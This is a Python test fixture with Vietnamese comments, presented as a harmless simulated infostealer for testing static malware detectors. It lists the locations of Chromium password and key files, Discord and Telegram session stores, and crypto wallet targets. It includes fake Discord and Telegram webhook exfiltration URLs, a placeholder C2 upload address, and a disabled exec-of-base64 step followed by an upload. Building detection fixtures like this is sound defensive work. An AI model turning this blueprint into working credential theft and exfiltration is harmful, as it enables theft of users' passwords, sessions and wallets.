"""MẪU MÃ ĐỘC GIẢ LẬP AN TOÀN (BENIGN SIMULATION FIXTURE).

CẢNH BÁO AN TOÀN:
- File này CHỈ dùng để kiểm thử bộ phân tích tĩnh (AST, Regex IOC, YARA, ReAct Agent).
- Khi chạy trực tiếp, script KHÔNG truy cập dữ liệu người dùng thật, KHÔNG đọc trình duyệt,
  KHÔNG giải mã DPAPI, và KHÔNG tạo bất kỳ kết nối mạng nào.
- Tất cả token, webhook, IP (RFC 5737 TEST-NET-2) và địa chỉ ví đều là dữ liệu giả lập.
"""

from __future__ import annotations

import base64
import json
import os
import shutil
import sqlite3
import subprocess
import urllib.request

# ==============================================================================
# Hằng số giả lập đặc trưng InfoStealer (dùng cho kiểm thử tĩnh IOC & YARA)
# ==============================================================================
SIMULATED_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/123456789012345678/FAKE_TEST_WEBHOOK_TOKEN_0123456789abcdef"
SIMULATED_TELEGRAM_BOT_TOKEN = "123456789:AAFakeTestBotTokenForStaticTest0001"
SIMULATED_TELEGRAM_API_URL = "https://api.telegram.org/bot123456789:AAFakeTestBotTokenForStaticTest0001/sendDocument"
SIMULATED_C2_URL = "http://198.51.100.42:8080/api/v1/upload"

SIMULATED_BTC_WALLET = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
SIMULATED_ETH_WALLET = "0x000000000000000000000000000000000000dEaD"

# Chuỗi Base64 hoàn toàn lành tính ("print('benign simulation payload')")
BENIGN_ENCODED_BANNER = "cHJpbnQoJ2JlbmlnbiBzaW11bGF0aW9uIHBheWxvYWQnKQ=="


def simulate_browser_credential_harvest(dry_run: bool = True) -> dict[str, str]:
    """Hàm mô phỏng tĩnh hành vi nhắm vào trình duyệt Chromium (không thực thi thật)."""
    chrome_user_data = r"Google\Chrome\User Data"
    edge_user_data = r"Microsoft\Edge\User Data"
    login_data_path = os.path.join(chrome_user_data, "Default", "Login Data")
    local_state_path = os.path.join(edge_user_data, "Local State")

    indicators = {
        "login_data": login_data_path,
        "local_state": local_state_path,
        "master_key_field": "os_crypt",
        "encrypted_key_field": "encrypted_key",
        "dpapi_api": "win32crypt.CryptUnprotectData",
        "cipher_mode": "AES.MODE_GCM",
    }

    if dry_run:
        return indicators

    # Nhánh không bao giờ chạy trong kiểm thử an toàn: chỉ giữ cấu trúc AST đặc trưng
    conn = sqlite3.connect(":memory:")
    conn.execute("SELECT origin_url, username_value, password_value FROM logins")
    conn.close()
    return indicators


def simulate_session_and_wallet_staging(dry_run: bool = True) -> dict[str, str]:
    """Hàm mô phỏng tĩnh hành vi nhắm vào Discord, Telegram tdata và ví tiền điện tử."""
    targets = {
        "discord_leveldb": r"discord\Local Storage\leveldb",
        "discord_token_marker": "dQw4w9WgXcQ",
        "telegram_tdata": r"Telegram Desktop\tdata",
        "metamask_ext": "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "exodus_dir": "exodus.wallet",
        "core_wallet": "wallet.dat",
    }
    if not dry_run:
        shutil.copyfile("nonexistent_source", "nonexistent_dest")
        subprocess.run(["whoami"], check=False)
    return targets


def simulate_xor_and_obfuscated_stage() -> bytes:
    """Hàm mô phỏng kỹ thuật làm rối chuỗi bằng XOR và giải mã Base64."""
    xor_key = 0x5A
    sample = b"benign_static_marker"
    transformed = bytes(b ^ xor_key for b in sample)

    # Giữ cấu trúc AST exec(base64.b64decode(...)) trong nhánh bất hoạt (if False)
    if False:  # pragma: no cover
        exec(base64.b64decode(BENIGN_ENCODED_BANNER))
        req = urllib.request.Request(
            SIMULATED_C2_URL,
            data=json.dumps({"marker": transformed.hex()}).encode("utf-8"),
        )
        urllib.request.urlopen(req, timeout=1)

    return transformed


def main() -> None:
    """Điểm vào an toàn: chỉ xác nhận file là mẫu kiểm thử lành tính."""
    print("[SAFE] Day la kich ban gia lap InfoStealer lanh tinh phuc vu kiem thu tinh.")
    print("[SAFE] Khong co du lieu nao bi doc va khong co ket noi mang nao duoc mo.")


if __name__ == "__main__":
    main()
